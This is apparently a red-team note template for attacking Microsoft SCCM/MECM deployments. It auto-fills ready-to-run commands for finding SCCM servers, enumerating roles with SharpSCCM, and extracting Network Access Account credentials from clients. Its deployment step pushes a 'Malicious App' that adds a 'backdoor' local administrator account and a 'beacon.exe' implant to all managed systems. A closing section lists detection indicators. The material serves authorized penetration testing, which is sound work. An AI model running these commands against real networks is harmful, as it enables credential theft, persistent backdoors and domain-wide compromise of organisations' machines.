---
# Attack-specific fields
sccm_server_fqdn:
sccm_server_ip:
sccm_site_code:
naa_username:
naa_password:
notes:
---

# SCCM / Microsoft Configuration Manager Attacks

> [!abstract] Attack Summary
> **SCCM (System Center Configuration Manager)** / **Microsoft Endpoint Configuration Manager (MECM)** is a powerful management platform. It often stores **Network Access Account (NAA)** credentials in DPAPI-protected blobs, and can be abused for lateral movement by pushing applications to managed clients. A compromised SCCM admin account can deploy malicious software domain-wide.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",   b?.domain   ?? "—"],
  ["DC IP",    b?.dc_ip    ?? "—"],
  ["Username", b?.username ?? "—"],
  ["OS Env",   b?.os_env   ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["SCCM Server FQDN",  `\`INPUT[text:sccm_server_fqdn]\``],
  ["SCCM Server IP",    `\`INPUT[text:sccm_server_ip]\``],
  ["Site Code",         `\`INPUT[text:sccm_site_code]\``],
  ["NAA Username Found",`\`INPUT[text:naa_username]\``],
  ["NAA Password Found",`\`INPUT[text:naa_password]\``],
]);
```

---

## Step 1 — Discover SCCM Infrastructure

**Windows — ADSearch (find SCCM objects)**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain = b?.domain ?? "DOMAIN";
dv.paragraph("```bash\n# Find management points\nexecute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe " +
  "--search \"(objectClass=mSSMSManagementPoint)\" --attributes dNSHostName,mSSMSSiteCode\n\n# Find SCCM servers\nexecute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe " +
  "--search \"(objectClass=mSSMSSite)\" --attributes *\n\n# Search via DNS (Management Point)\nresolve-dnsname 'sms._msdcs." + domain + "'\n```");
```

**Linux**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain   = b?.domain ?? "DOMAIN";
const dc_ip    = b?.dc_ip  ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
const domParts = domain.split('.').map(x => "DC=" + x).join(',');
dv.paragraph("```bash\nldapsearch -x -H ldap://" + dc_ip + " -D '" + username + "@" + domain + "' -w '" + password + "' " +
  "-b 'CN=System Management,CN=System," + domParts + "' '(objectClass=*)' dNSHostName,mSSMSSiteCode\n```");
```

SCCM Server: `INPUT[text:sccm_server_fqdn]` | Site Code: `INPUT[text:sccm_site_code]`

---

## Step 2 — Enumerate SCCM Roles and Access

**Windows — SharpSCCM / SCCMHunter**
```dataviewjs
const p = dv.current();
const sccmServer = p?.sccm_server_fqdn || "SCCM_SERVER";
const siteCode   = p?.sccm_site_code   || "SITE_CODE";
dv.paragraph("```bash\n# Enumerate SCCM\nexecute-assembly C:\\Tools\\SharpSCCM\\SharpSCCM\\bin\\Release\\SharpSCCM.exe get site-info -sms " + sccmServer + "\n\nexecute-assembly C:\\Tools\\SharpSCCM\\SharpSCCM\\bin\\Release\\SharpSCCM.exe get class-instances SMS_R_System -sms " + sccmServer + " -sc " + siteCode + "\n\n# Get collections\nexecute-assembly C:\\Tools\\SharpSCCM\\SharpSCCM\\bin\\Release\\SharpSCCM.exe get collections -sms " + sccmServer + " -sc " + siteCode + "\n\n# Find admin users\nexecute-assembly C:\\Tools\\SharpSCCM\\SharpSCCM\\bin\\Release\\SharpSCCM.exe get class-instances SMS_Admin -sms " + sccmServer + " -sc " + siteCode + "\n```");
```

---

## Step 3 — Extract NAA (Network Access Account) Credentials

> [!info] The NAA credentials are stored in the WMI repository on SCCM-managed clients as DPAPI-encrypted blobs. They're used by clients to access content from distribution points.

**Windows — SharpSCCM (on managed client)**
```dataviewjs
dv.paragraph("```bash\n# Retrieve NAA creds from client (requires SYSTEM on the client)\nexecute-assembly C:\\Tools\\SharpSCCM\\SharpSCCM\\bin\\Release\\SharpSCCM.exe local naa\n\n# Or via WMI directly\nexecute-assembly C:\\Tools\\SharpSCCM\\SharpSCCM\\bin\\Release\\SharpSCCM.exe local naa -wmi\n```");
```

**Windows — SCCM Policy Request (NetworkAccessAccount)**
```dataviewjs
dv.paragraph("```powershell\n# Request machine policy and extract NAA\n$mp = 'SCCM_SERVER'\n$policy = Invoke-WebRequest -Uri \"http://$mp/SMS_MP/.sms_aut?MPLIST\" -UseDefaultCredentials\n\n# SharpSCCM will do this automatically:\n# execute-assembly SharpSCCM.exe local naa\n```");
```

NAA Username: `INPUT[text:naa_username]` | Password: `INPUT[text:naa_password]`

---

## Step 4 — Lateral Movement via SCCM Application Deployment

> [!warning] Requires SCCM Admin rights. This deploys software to all clients in a collection.

**Windows — SharpSCCM Application Deploy**
```dataviewjs
const p = dv.current();
const sccmServer = p?.sccm_server_fqdn || "SCCM_SERVER";
const siteCode   = p?.sccm_site_code   || "SITE_CODE";
dv.paragraph("```bash\n# Create malicious application and deploy to collection\nexecute-assembly C:\\Tools\\SharpSCCM\\SharpSCCM\\bin\\Release\\SharpSCCM.exe exec -sms " + sccmServer + " -sc " + siteCode +
  " -d 'cmd.exe /c net user backdoor Passw0rd! /add && net localgroup administrators backdoor /add'" +
  " -n 'Malicious App' --device-name COLLECTION_NAME\n\n# Or deploy to all clients\nexecute-assembly C:\\Tools\\SharpSCCM\\SharpSCCM\\bin\\Release\\SharpSCCM.exe exec -sms " + sccmServer + " -sc " + siteCode +
  " -d 'beacon.exe' -n 'Update' --collection-name 'All Systems'\n```");
```

---

## Step 5 — Coerce Auth via SCCM

> [!info] SCCM management points can be coerced to authenticate via specific HTTP paths.

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const lhost  = b?.lhost ?? "ATTACKER_IP";
const sccmServer = p?.sccm_server_fqdn || "SCCM_SERVER";
dv.paragraph("```bash\n# Coerce SCCM MP to authenticate (for relay)\ncurl -v -k 'http://" + sccmServer + "/ccm_system_windowsauth/request'\n\n# Or use SharpSCCM\nexecute-assembly C:\\Tools\\SharpSCCM\\SharpSCCM\\bin\\Release\\SharpSCCM.exe invoke admin-service -sms " + sccmServer + " -sc SITE_CODE\n```");
```

---

## OPSEC

> [!warning] Detection Indicators
> - SCCM application deployment is logged in the site server's SMSPROV.log and AppMgmt.log.
> - NAA credential reads generate DPAPI events on the client.
> - Unusual SCCM admin activity (new collections, new deployments) is detectable in SCCM's built-in audit logs.
> - SharpSCCM queries via WMI may be anomalous on non-admin workstations.

---

## Notes & Results

`INPUT[textarea:notes]`
